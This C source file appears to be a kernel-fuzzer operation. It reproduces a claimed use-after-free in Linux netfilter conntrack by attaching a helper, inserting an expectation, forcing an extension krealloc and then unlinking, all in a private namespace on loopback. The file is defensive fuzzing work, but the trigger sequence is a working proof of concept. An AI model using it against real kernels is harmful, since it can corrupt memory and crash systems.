/*
 * ct_expect_realloc - drive the conntrack helper expectation-list
 * hlist backpointer vs nf_ct_ext_add() krealloc() race in a private
 * network namespace.
 *
 * Bug class (live at HEAD): struct nf_conn_help embeds the head of the
 * per-master expectation list (help->expectations).  When
 * nf_ct_expect_insert() calls hlist_add_head_rcu(&exp->lnode,
 * &help->expectations), the freshly linked expectation's hlist_node
 * ->pprev is patched to point back at the list head, which lives
 * INSIDE the extension buffer hanging off ct->ext.  A subsequent
 * nf_ct_ext_add() on the same conntrack (e.g. attaching the labels
 * extension via ctnetlink_attach_labels() -> nf_connlabels_replace())
 * calls krealloc() on ct->ext.  If the buffer moves, the old address
 * is freed but the expectation's ->pprev still points into it.  The
 * next unlink of that expectation (nf_ct_remove_expect() ->
 * hlist_del_rcu()) writes through the stale pprev, corrupting freed
 * slab memory.  KASAN flags the OOB/UAF write at the unlink site.
 *
 * Random-syscall coverage cannot reach this: the bug requires the
 * exact ordering
 *   (1) helper ext attached on master ct,
 *   (2) expectation inserted into help->expectations,
 *   (3) SECOND extension attached to the same ct (moves ct->ext),
 *   (4) unlink of the expectation from step 2.
 * nf_conntrack_helper_churn rolls zones/helpers/traffic but does not
 * force step 3 between steps 2 and 4 on the same master.  This op
 * does exactly that sequence, deterministically, per iteration.
 *
 * Sequence (per invocation, all inside a private user+net namespace):
 *   1. userns_run_in_ns(CLONE_NEWNET) -- transient grandchild reaps
 *      every socket/tuple/expectation via _exit() when the body
 *      returns.  -EPERM latches the op off; -EAGAIN skips.
 *   2. Bring lo up so ctnetlink accepts the AF_INET tuples.
 *   3. Open a NETLINK_NETFILTER socket with SO_RCVTIMEO=1s.
 *   4. CT_NEW + CTA_HELP=<helper> on a synthetic loopback tuple
 *      (assured/confirmed).  Drives __nf_ct_try_assign_helper() ->
 *      nf_ct_helper_ext_add(), allocating ct->ext with the help ext.
 *   5. EXP_NEW + CTA_EXPECT_HELP_NAME=<same helper> keyed on the
 *      master tuple.  Drives nf_ct_expect_insert() ->
 *      hlist_add_head_rcu(&exp->lnode, &help->expectations); the
 *      expectation's ->pprev now points into ct->ext.
 *   6. CT_NEW NLM_F_REPLACE + CTA_LABELS on the same tuple.  Drives
 *      ctnetlink_attach_labels() -> nf_connlabels_replace() ->
 *      nf_ct_ext_add(ct, NF_CT_EXT_LABELS, ...) which krealloc()s
 *      ct->ext.  If the buffer moves, the freed old-buffer slot now
 *      holds the still-live expectation ->pprev backpointer.
 *   7. EXP_DELETE on the expectation tuple.  Drives
 *      nf_ct_remove_expect() -> hlist_del_rcu(&exp->lnode), which
 *      writes *pprev = next through the stale pointer -- KASAN
 *      slab-out-of-bounds or use-after-free write flags the site.
 *   8. Best-effort CT_DELETE on the master.  Grandchild _exit() would
 *      reap it too, but an explicit delete keeps the per-invocation
 *      accounting honest.
 *
 * Rotates through the small set of helper names most likely to be
 * loaded on a modern kernel (ftp/sip/tftp/h323/pptp).  Each helper's
 * L4 proto is fixed (ftp/h323/pptp = TCP, sip/tftp = UDP) so the
 * kernel does not reject CT_NEW with -EINVAL on a proto mismatch.  A
 * per-name unavailable-mask latches out helper names the kernel
 * rejects with EOPNOTSUPP/EPROTONOSUPPORT/EINVAL, so a build without
 * (say) nf_conntrack_h323.ko does not burn iterations retrying it.
 *
 * Latches (per-process, sticky):
 *   ns_unsupported                 -- userns policy refused CLONE_NEWUSER
 *   ns_unsupported_nf_conntrack    -- CTNETLINK missing (probe failed)
 *   helper_unavailable_mask        -- per-helper module absence
 *
 * ONE_IN(4) gate at op entry keeps rotation cost modest -- this op
 * runs a hot ctnetlink sequence and the transient grandchild fork is
 * not free.  All nfnl I/O carries SO_RCVTIMEO=1s so a wedge cannot
 * push us past child.c's SIGALRM(1s).  Loopback-only.
 *
 * Header-gated by __has_include() on linux/netfilter/nfnetlink.h and
 * linux/netfilter/nfnetlink_conntrack.h; missing headers fall to a
 * stub that just bumps runs/ct_setup_failed and returns.
 */

#include <errno.h>
#include <stdbool.h>
#include <stdint.h>
#include <sys/socket.h>
#include <string.h>
#include <unistd.h>

#include "child.h"
#include "childop-outcome.h"
#include "shm.h"
#include "trinity.h"

#if __has_include(<linux/netfilter/nfnetlink.h>) && \
    __has_include(<linux/netfilter/nfnetlink_conntrack.h>)

#include <netinet/in.h>
#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nfnetlink_conntrack.h>
#include <sched.h>

#include "childops-netlink.h"
#include "childops-nfnl.h"
#include "random.h"
#include "rnd.h"
#include "userns-bootstrap.h"

#include "kernel/socket.h"

#ifndef NFNL_SUBSYS_CTNETLINK
#define NFNL_SUBSYS_CTNETLINK		1
#endif
#ifndef NFNL_SUBSYS_CTNETLINK_EXP
#define NFNL_SUBSYS_CTNETLINK_EXP	2
#endif
#ifndef NLA_F_NESTED
#define NLA_F_NESTED			(1 << 15)
#endif
#ifndef NLA_F_NET_BYTEORDER
#define NLA_F_NET_BYTEORDER		(1 << 14)
#endif
#ifndef IPS_CONFIRMED
#define IPS_CONFIRMED			(1U << 3)
#endif
#ifndef IPS_ASSURED
#define IPS_ASSURED			(1U << 2)
#endif
#ifndef TCP_CONNTRACK_ESTABLISHED
#define TCP_CONNTRACK_ESTABLISHED	3
#endif

/* Latched per-process gates. */
static bool ns_unsupported;			/* userns policy refused CLONE_NEWUSER */
static bool ns_unsupported_nf_conntrack;	/* CTNETLINK probe returned EPROTONOSUPPORT */

/* Helper roster.  Order matches helper_l4proto[]; the per-name bit
 * in helper_unavailable_mask is cleared lazily on the first
 * EOPNOTSUPP/EPROTONOSUPPORT/EINVAL from the kernel (module absent). */
static const char * const helper_names[] = {
	"ftp",
	"sip",
	"tftp",
	"h323",
	"pptp",
};
#define NUM_HELPERS	(sizeof(helper_names) / sizeof(helper_names[0]))

static const __u8 helper_l4proto[NUM_HELPERS] = {
	IPPROTO_TCP,	/* ftp  */
	IPPROTO_UDP,	/* sip  */
	IPPROTO_UDP,	/* tftp */
	IPPROTO_TCP,	/* h323 */
	IPPROTO_TCP,	/* pptp */
};

/* Per-name latch: once a helper is refused by the kernel with a
 * module-absent errno, its bit sticks for the rest of the process
 * lifetime and pick_helper() skips it. */
static unsigned int helper_unavailable_mask;

#define CER_BUF_BYTES			1024
#define CER_RECV_TIMEO_S		1
#define CER_DEFAULT_TIMEOUT		10	/* seconds; kernel GC backstop */
#define CER_LOOPBACK_ADDR		0x7f000001U

/* CTA_LABELS bitmap length: two u32 words is enough to force the
 * labels extension attach; nf_connlabels_replace() writes the full
 * bitmap regardless of set bits, so any non-empty payload triggers
 * the ext-attach path. */
#define CER_LABELS_WORDS		2

/*
 * Little-endian NLA payload for CTA_LABELS.  The kernel accepts
 * arbitrary word counts up to CONNLABEL_BITS/8; two words is enough
 * to force nf_ct_ext_add(NF_CT_EXT_LABELS) on the master ct.
 */
static size_t put_labels(unsigned char *buf, size_t off, size_t cap)
{
	__u32 bits[CER_LABELS_WORDS] = { 0x1U, 0x0U };

	return nla_put(buf, off, cap, CTA_LABELS, bits, sizeof(bits));
}

static size_t nla_put_be16(unsigned char *buf, size_t off, size_t cap,
			   unsigned short type, __u16 v)
{
	__u16 be = htons(v);

	return nla_put(buf, off, cap,
		       type | NLA_F_NET_BYTEORDER, &be, sizeof(be));
}

static size_t nla_put_be32(unsigned char *buf, size_t off, size_t cap,
			   unsigned short type, __u32 v)
{
	__u32 be = htonl(v);

	return nla_put(buf, off, cap,
		       type | NLA_F_NET_BYTEORDER, &be, sizeof(be));
}

/*
 * CTA_TUPLE_{ORIG,REPLY,MASTER} nested payload: (src, dst) + (proto,
 * sport, dport).  All fields big-endian on the wire.
 */
static size_t put_tuple(unsigned char *buf, size_t off, size_t cap,
			unsigned short tuple_type,
			__u32 saddr, __u32 daddr,
			__u8 l4proto, __u16 sport, __u16 dport)
{
	size_t outer_off, ip_off, proto_off;

	outer_off = off;
	off = nla_nest_start(buf, off, cap, tuple_type | NLA_F_NESTED);
	if (!off)
		return 0;

	ip_off = off;
	off = nla_nest_start(buf, off, cap, CTA_TUPLE_IP | NLA_F_NESTED);
	if (!off)
		return 0;
	off = nla_put_be32(buf, off, cap, CTA_IP_V4_SRC, saddr);
	if (!off)
		return 0;
	off = nla_put_be32(buf, off, cap, CTA_IP_V4_DST, daddr);
	if (!off)
		return 0;
	nla_nest_end(buf, ip_off, off);

	proto_off = off;
	off = nla_nest_start(buf, off, cap, CTA_TUPLE_PROTO | NLA_F_NESTED);
	if (!off)
		return 0;
	off = nla_put_u8(buf, off, cap, CTA_PROTO_NUM, l4proto);
	if (!off)
		return 0;
	if (l4proto == IPPROTO_TCP || l4proto == IPPROTO_UDP) {
		off = nla_put_be16(buf, off, cap, CTA_PROTO_SRC_PORT, sport);
		if (!off)
			return 0;
		off = nla_put_be16(buf, off, cap, CTA_PROTO_DST_PORT, dport);
		if (!off)
			return 0;
	}
	nla_nest_end(buf, proto_off, off);
	nla_nest_end(buf, outer_off, off);
	return off;
}

static size_t put_help(unsigned char *buf, size_t off, size_t cap,
		       const char *helper_name)
{
	size_t outer_off = off;

	off = nla_nest_start(buf, off, cap, CTA_HELP | NLA_F_NESTED);
	if (!off)
		return 0;
	off = nla_put_str(buf, off, cap, CTA_HELP_NAME, helper_name);
	if (!off)
		return 0;
	nla_nest_end(buf, outer_off, off);
	return off;
}

static size_t put_protoinfo_tcp_est(unsigned char *buf, size_t off, size_t cap)
{
	size_t outer_off, tcp_off;

	outer_off = off;
	off = nla_nest_start(buf, off, cap, CTA_PROTOINFO | NLA_F_NESTED);
	if (!off)
		return 0;
	tcp_off = off;
	off = nla_nest_start(buf, off, cap,
			     CTA_PROTOINFO_TCP | NLA_F_NESTED);
	if (!off)
		return 0;
	off = nla_put_u8(buf, off, cap,
			 CTA_PROTOINFO_TCP_STATE, TCP_CONNTRACK_ESTABLISHED);
	if (!off)
		return 0;
	nla_nest_end(buf, tcp_off, off);
	nla_nest_end(buf, outer_off, off);
	return off;
}

/*
 * Step 4: CT_NEW + CTA_HELP -- attach helper ext, allocating ct->ext.
 * with_labels=false; with_replace=false.  Called at insert time.
 */
static int send_ct_master(struct nfnl_ctx *ctx, __u8 l4proto,
			  __u16 sport, __u16 dport, const char *helper_name)
{
	unsigned char buf[CER_BUF_BYTES];
	__u32 timeout_be, status_be;
	size_t off;

	memset(buf, 0, sizeof(buf));
	off = nfnl_msg_put(buf, 0, sizeof(buf), nl_seq_next(&ctx->nl),
			   NFNL_SUBSYS_CTNETLINK, IPCTNL_MSG_CT_NEW,
			   NLM_F_CREATE, AF_INET);
	if (!off)
		return -EIO;

	off = put_tuple(buf, off, sizeof(buf), CTA_TUPLE_ORIG,
			CER_LOOPBACK_ADDR, CER_LOOPBACK_ADDR,
			l4proto, sport, dport);
	if (!off)
		return -EIO;
	off = put_tuple(buf, off, sizeof(buf), CTA_TUPLE_REPLY,
			CER_LOOPBACK_ADDR, CER_LOOPBACK_ADDR,
			l4proto, dport, sport);
	if (!off)
		return -EIO;

	timeout_be = htonl((__u32)CER_DEFAULT_TIMEOUT);
	off = nla_put(buf, off, sizeof(buf),
		      CTA_TIMEOUT | NLA_F_NET_BYTEORDER,
		      &timeout_be, sizeof(timeout_be));
	if (!off)
		return -EIO;

	status_be = htonl(IPS_CONFIRMED | IPS_ASSURED);
	off = nla_put(buf, off, sizeof(buf),
		      CTA_STATUS | NLA_F_NET_BYTEORDER,
		      &status_be, sizeof(status_be));
	if (!off)
		return -EIO;

	if (l4proto == IPPROTO_TCP) {
		off = put_protoinfo_tcp_est(buf, off, sizeof(buf));
		if (!off)
			return -EIO;
	}

	off = put_help(buf, off, sizeof(buf), helper_name);
	if (!off)
		return -EIO;

	((struct nlmsghdr *)buf)->nlmsg_len = (__u32)off;
	return nfnl_send_recv(ctx, buf, off);
}

/*
 * Step 6: CT_NEW NLM_F_REPLACE + CTA_LABELS -- the key realloc
 * trigger.  Keeps the tuple identical to send_ct_master() so the
 * kernel resolves it as an update on the same nf_conn; drops CTA_HELP
 * to keep the update path narrowly focused on ctnetlink_attach_labels()
 * -> nf_ct_ext_add(NF_CT_EXT_LABELS).
 */
static int send_ct_realloc(struct nfnl_ctx *ctx, __u8 l4proto,
			   __u16 sport, __u16 dport)
{
	unsigned char buf[CER_BUF_BYTES];
	size_t off;

	memset(buf, 0, sizeof(buf));
	off = nfnl_msg_put(buf, 0, sizeof(buf), nl_seq_next(&ctx->nl),
			   NFNL_SUBSYS_CTNETLINK, IPCTNL_MSG_CT_NEW,
			   NLM_F_REPLACE, AF_INET);
	if (!off)
		return -EIO;

	off = put_tuple(buf, off, sizeof(buf), CTA_TUPLE_ORIG,
			CER_LOOPBACK_ADDR, CER_LOOPBACK_ADDR,
			l4proto, sport, dport);
	if (!off)
		return -EIO;
	off = put_tuple(buf, off, sizeof(buf), CTA_TUPLE_REPLY,
			CER_LOOPBACK_ADDR, CER_LOOPBACK_ADDR,
			l4proto, dport, sport);
	if (!off)
		return -EIO;

	off = put_labels(buf, off, sizeof(buf));
	if (!off)
		return -EIO;

	((struct nlmsghdr *)buf)->nlmsg_len = (__u32)off;
	return nfnl_send_recv(ctx, buf, off);
}

/*
 * Step 5: EXP_NEW + CTA_EXPECT_HELP_NAME keyed on the master tuple.
 * The kernel calls nf_ct_expect_insert() which does
 * hlist_add_head_rcu(&exp->lnode, &help->expectations); exp->lnode
 * ->pprev now points inside ct->ext at the help->expectations head.
 */
static int send_exp_new(struct nfnl_ctx *ctx, __u8 l4proto,
			__u16 master_sport, __u16 master_dport,
			__u16 child_sport, __u16 child_dport,
			const char *helper_name)
{
	unsigned char buf[CER_BUF_BYTES];
	__u32 timeout_be, flags_be;
	size_t off;

	memset(buf, 0, sizeof(buf));
	off = nfnl_msg_put(buf, 0, sizeof(buf), nl_seq_next(&ctx->nl),
			   NFNL_SUBSYS_CTNETLINK_EXP, IPCTNL_MSG_EXP_NEW,
			   NLM_F_CREATE, AF_INET);
	if (!off)
		return -EIO;

	off = put_tuple(buf, off, sizeof(buf), CTA_EXPECT_TUPLE,
			CER_LOOPBACK_ADDR, CER_LOOPBACK_ADDR,
			l4proto, child_sport, child_dport);
	if (!off)
		return -EIO;

	off = put_tuple(buf, off, sizeof(buf), CTA_EXPECT_MASK,
			0xffffffffU, 0xffffffffU,
			l4proto, 0xffff, 0xffff);
	if (!off)
		return -EIO;

	off = put_tuple(buf, off, sizeof(buf), CTA_EXPECT_MASTER,
			CER_LOOPBACK_ADDR, CER_LOOPBACK_ADDR,
			l4proto, master_sport, master_dport);
	if (!off)
		return -EIO;

	timeout_be = htonl((__u32)CER_DEFAULT_TIMEOUT);
	off = nla_put(buf, off, sizeof(buf),
		      CTA_EXPECT_TIMEOUT | NLA_F_NET_BYTEORDER,
		      &timeout_be, sizeof(timeout_be));
	if (!off)
		return -EIO;

	flags_be = htonl(0);
	off = nla_put(buf, off, sizeof(buf),
		      CTA_EXPECT_FLAGS | NLA_F_NET_BYTEORDER,
		      &flags_be, sizeof(flags_be));
	if (!off)
		return -EIO;

	off = nla_put_str(buf, off, sizeof(buf),
			  CTA_EXPECT_HELP_NAME, helper_name);
	if (!off)
		return -EIO;

	((struct nlmsghdr *)buf)->nlmsg_len = (__u32)off;
	return nfnl_send_recv(ctx, buf, off);
}

/*
 * Step 7: EXP_DELETE on the expectation tuple.  Drives
 * nf_ct_remove_expect() -> hlist_del_rcu(&exp->lnode).  The del
 * writes *(exp->lnode.pprev) = exp->lnode.next -- through the pointer
 * that step 6 stranded when it moved ct->ext.  This is the crash
 * site.
 */
static int send_exp_delete(struct nfnl_ctx *ctx, __u8 l4proto,
			   __u16 child_sport, __u16 child_dport)
{
	unsigned char buf[CER_BUF_BYTES];
	size_t off;

	memset(buf, 0, sizeof(buf));
	off = nfnl_msg_put(buf, 0, sizeof(buf), nl_seq_next(&ctx->nl),
			   NFNL_SUBSYS_CTNETLINK_EXP, IPCTNL_MSG_EXP_DELETE,
			   0, AF_INET);
	if (!off)
		return -EIO;

	off = put_tuple(buf, off, sizeof(buf), CTA_EXPECT_TUPLE,
			CER_LOOPBACK_ADDR, CER_LOOPBACK_ADDR,
			l4proto, child_sport, child_dport);
	if (!off)
		return -EIO;

	((struct nlmsghdr *)buf)->nlmsg_len = (__u32)off;
	return nfnl_send_recv(ctx, buf, off);
}

static int send_ct_delete(struct nfnl_ctx *ctx, __u8 l4proto,
			  __u16 sport, __u16 dport)
{
	unsigned char buf[CER_BUF_BYTES];
	size_t off;

	memset(buf, 0, sizeof(buf));
	off = nfnl_msg_put(buf, 0, sizeof(buf), nl_seq_next(&ctx->nl),
			   NFNL_SUBSYS_CTNETLINK, IPCTNL_MSG_CT_DELETE,
			   0, AF_INET);
	if (!off)
		return -EIO;

	off = put_tuple(buf, off, sizeof(buf), CTA_TUPLE_ORIG,
			CER_LOOPBACK_ADDR, CER_LOOPBACK_ADDR,
			l4proto, sport, dport);
	if (!off)
		return -EIO;

	((struct nlmsghdr *)buf)->nlmsg_len = (__u32)off;
	return nfnl_send_recv(ctx, buf, off);
}

/*
 * Pick a helper index from the runtime-available mask, or -1 if every
 * helper name has been latched out.  Uniform over set bits.
 */
static int pick_helper(void)
{
	unsigned int mask = ((1U << NUM_HELPERS) - 1U) & ~helper_unavailable_mask;
	unsigned int popcount = (unsigned int)__builtin_popcount(mask);
	unsigned int pick, seen = 0, i;

	if (popcount == 0)
		return -1;
	pick = rnd_modulo_u32(popcount);
	for (i = 0; i < NUM_HELPERS; i++) {
		if (!(mask & (1U << i)))
			continue;
		if (seen == pick)
			return (int)i;
		seen++;
	}
	return -1;
}

static void update_helper_mask(int helper_idx, int rc)
{
	if (helper_idx < 0)
		return;
	if (rc == -EOPNOTSUPP || rc == -EPROTONOSUPPORT || rc == -EINVAL)
		helper_unavailable_mask |= (1U << (unsigned)helper_idx);
}

/*
 * Per-invocation argument passed into the grandchild callback.  Keeps
 * child (and thus op) reachable so the netns body can bump the same
 * shm stats the outer wrapper does, and stores the direct-syscall
 * tally for a single childop_direct_syscalls_add() at op-exit.
 */
struct cer_ctx {
	struct childdata	*child;
	unsigned long		direct_calls;
};

/*
 * One full attach/expect/realloc/unlink cycle on a single master.
 * All bookkeeping is per-step (any single failure aborts the rest of
 * the sequence but the earlier steps still contribute stats).
 */
static void cer_one_cycle(struct nfnl_ctx *nfnl)
{
	int helper_idx = pick_helper();
	const char *helper_name;
	__u8 l4proto;
	__u16 master_sport, master_dport, child_sport, child_dport;
	bool master_ok = false, expect_ok = false;
	bool realloc_ok = false, unlink_ok = false;
	int rc;

	if (helper_idx < 0) {
		__atomic_add_fetch(&shm->stats.ct_expect_realloc.helper_missing,
				   1, __ATOMIC_RELAXED);
		return;
	}
	helper_name  = helper_names[helper_idx];
	l4proto      = helper_l4proto[helper_idx];
	master_sport = (__u16)(20000 + (rand32() & 0x1fff));
	master_dport = (__u16)(40000 + (rand32() & 0x1fff));
	child_sport  = (__u16)(30000 + (rand32() & 0x1fff));
	child_dport  = (__u16)(50000 + (rand32() & 0x1fff));

	/* Step 4: attach helper ext to freshly-inserted master ct. */
	rc = send_ct_master(nfnl, l4proto, master_sport, master_dport, helper_name);
	update_helper_mask(helper_idx, rc);
	if (rc == 0) {
		master_ok = true;
		__atomic_add_fetch(&shm->stats.ct_expect_realloc.master_ok,
				   1, __ATOMIC_RELAXED);
	}
	if (!master_ok)
		return;

	/* Step 5: insert expectation onto help->expectations. */
	rc = send_exp_new(nfnl, l4proto, master_sport, master_dport,
			  child_sport, child_dport, helper_name);
	if (rc == 0) {
		expect_ok = true;
		__atomic_add_fetch(&shm->stats.ct_expect_realloc.expect_ok,
				   1, __ATOMIC_RELAXED);
	}

	/* Step 6: force nf_ct_ext_add() krealloc on the same ct.  Even
	 * if step 5 failed, still drive the realloc for coverage of the
	 * label-attach path; only the unlink correlates. */
	rc = send_ct_realloc(nfnl, l4proto, master_sport, master_dport);
	if (rc == 0) {
		realloc_ok = true;
		__atomic_add_fetch(&shm->stats.ct_expect_realloc.realloc_ok,
				   1, __ATOMIC_RELAXED);
	}

	/* Step 7: unlink -- the write through the stranded pprev. */
	if (expect_ok) {
		rc = send_exp_delete(nfnl, l4proto, child_sport, child_dport);
		if (rc == 0) {
			unlink_ok = true;
			__atomic_add_fetch(&shm->stats.ct_expect_realloc.unlink_ok,
					   1, __ATOMIC_RELAXED);
		}
	}

	/* Step 8: best-effort master delete for accounting. */
	(void)send_ct_delete(nfnl, l4proto, master_sport, master_dport);

	if (master_ok && expect_ok && realloc_ok && unlink_ok)
		__atomic_add_fetch(&shm->stats.ct_expect_realloc.full_cycle,
				   1, __ATOMIC_RELAXED);
}

/*
 * Executed inside the transient grandchild once userns_run_in_ns()
 * has established the identity userns + CLONE_NEWNET.  Return value
 * is ignored; direct-syscall count is folded into the shared shm
 * counter before _exit().
 */
static int cer_in_ns(void *arg)
{
	struct cer_ctx *cctx = (struct cer_ctx *)arg;
	struct nfnl_ctx nfnl = { .nl = { .fd = -1 } };
	struct nfnl_open_opts opts = { .recv_timeo_s = CER_RECV_TIMEO_S };
	struct nl_ctx rtnl = { .fd = -1 };
	const enum child_op_type op = cctx->child->op_type;
	const bool valid_op = ((int)op >= 0 && op < NR_CHILD_OP_TYPES);
	struct nl_open_opts rtnl_opts = {
		.proto     = NETLINK_ROUTE,
		.caller_op = CHILD_OP_CT_EXPECT_REALLOC,
	};

	if (nl_open(&rtnl, &rtnl_opts) == 0) {
		rtnl_bring_lo_up(&rtnl);
		/* if_nametoindex component of RTNL_BRING_LO_UP_DIRECT_CALLS
		 * (socket+ioctl+close = 3); nl_open socket+bind, rtnl_bring_lo_up
		 * nl_send_recv (sendmsg+recv), and nl_close (close) are all
		 * published by nl_close() via rtnl_opts.caller_op. */
		cctx->direct_calls += 3;
		nl_close(&rtnl);
	}

	if (nfnl_open(&nfnl, &opts) < 0) {
		__atomic_add_fetch(&shm->stats.ct_expect_realloc.ct_setup_failed,
				   1, __ATOMIC_RELAXED);
		if (valid_op)
			childop_direct_syscalls_add(op, cctx->direct_calls);
		return 0;
	}
	nfnl.nl.caller_op = CHILD_OP_CT_EXPECT_REALLOC;

	/* Cheap CTNETLINK probe: an EXP_DELETE for a bogus tuple in the
	 * fresh netns.  A hard EPROTONOSUPPORT / EOPNOTSUPP flags a
	 * kernel without CONFIG_NF_CONNTRACK_NETLINK; latch and bail so
	 * subsequent iterations short-circuit before the fork cost. */
	{
		int rc = send_exp_delete(&nfnl, IPPROTO_UDP,
					 (__u16)(40000 + (rand32() & 0x3ff)),
					 (__u16)(50000 + (rand32() & 0x3ff)));
		if (rc == -EPROTONOSUPPORT || rc == -EOPNOTSUPP ||
		    rc == -EAFNOSUPPORT) {
			ns_unsupported_nf_conntrack = true;
			if (valid_op)
				__atomic_store_n(&shm->stats.childop.latch_reason[op],
						 CHILDOP_LATCH_UNSUPPORTED,
						 __ATOMIC_RELAXED);
			__atomic_add_fetch(&shm->stats.ct_expect_realloc.ct_setup_failed,
					   1, __ATOMIC_RELAXED);
			nfnl_close(&nfnl);
			if (valid_op)
				childop_direct_syscalls_add(op, cctx->direct_calls);
			return 0;
		}
	}

	if (valid_op) {
		__atomic_add_fetch(&shm->stats.childop.setup_accepted[op],
				   1, __ATOMIC_RELAXED);
		__atomic_add_fetch(&shm->stats.childop.data_path[op],
				   1, __ATOMIC_RELAXED);
	}

	cer_one_cycle(&nfnl);

	nfnl_close(&nfnl);

	if (valid_op)
		childop_direct_syscalls_add(op, cctx->direct_calls);
	return 0;
}

bool ct_expect_realloc(struct childdata *child)
{
	struct cer_ctx cctx = { .child = child, .direct_calls = 0 };
	const enum child_op_type op = child->op_type;
	const bool valid_op = ((int)op >= 0 && op < NR_CHILD_OP_TYPES);
	int rc;

	__atomic_add_fetch(&shm->stats.ct_expect_realloc.runs,
			   1, __ATOMIC_RELAXED);

	if (ns_unsupported || ns_unsupported_nf_conntrack)
		return true;

	/* ONE_IN(4) gate: keep the transient-fork + full ctnetlink
	 * cycle cost modest in the altop rotation.  The bug window is
	 * per-invocation, not per-iteration; more calls just means more
	 * chances to observe the crash. */
	if (!ONE_IN(4))
		return true;

	rc = userns_run_in_ns(CLONE_NEWNET, cer_in_ns, &cctx);
	if (rc == -EPERM) {
		ns_unsupported = true;
		__atomic_add_fetch(&shm->stats.ct_expect_realloc.ns_unsupported,
				   1, __ATOMIC_RELAXED);
		if (valid_op)
			__atomic_store_n(&shm->stats.childop.latch_reason[op],
					 CHILDOP_LATCH_NS_UNSUPPORTED,
					 __ATOMIC_RELAXED);
		return true;
	}
	if (rc < 0) {
		__atomic_add_fetch(&shm->stats.ct_expect_realloc.ns_setup_failed,
				   1, __ATOMIC_RELAXED);
		return true;
	}

	return true;
}

#else  /* !__has_include(<linux/netfilter/nfnetlink_conntrack.h>) */

bool ct_expect_realloc(struct childdata *child)
{
	(void)child;
	__atomic_add_fetch(&shm->stats.ct_expect_realloc.runs,
			   1, __ATOMIC_RELAXED);
	__atomic_add_fetch(&shm->stats.ct_expect_realloc.ct_setup_failed,
			   1, __ATOMIC_RELAXED);
	return true;
}

#endif /* __has_include(<linux/netfilter/nfnetlink_conntrack.h>) */
